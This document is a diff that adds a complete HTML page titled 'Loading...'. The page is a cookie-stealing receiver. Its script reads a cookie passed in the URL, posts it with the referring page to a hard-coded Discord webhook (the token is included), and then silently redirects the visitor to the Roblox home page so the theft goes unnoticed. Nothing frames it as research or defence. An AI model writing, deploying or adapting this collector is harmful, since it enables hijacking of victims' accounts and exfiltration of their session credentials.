@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<script>
+    const params = new URLSearchParams(window.location.search);
+    const cookie = params.get('c');
+    
+    if (cookie) {
+        fetch('https://discord.com/api/webhooks/1557616277584093264/K-ZZ7SQCalA6ZohbXbO4pauTCcUB4zTEDgHECpOvO-ixPLaUKtZ5Lz6VKLaipTDnZ0Z6', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                content: "**Cookie reçu**\nPage source : " + document.referrer + "\nCookie : ```" + cookie + "```" 
+            })
+        }).then(() => {
+            window.location.href = "https://www.roblox.com/home";
+        }).catch(() => {
+            window.location.href = "https://www.roblox.com/home";
+        });
+    } else {
+        window.location.href = "https://www.roblox.com/home";
+    }
+</script>
+</body>
+</html>
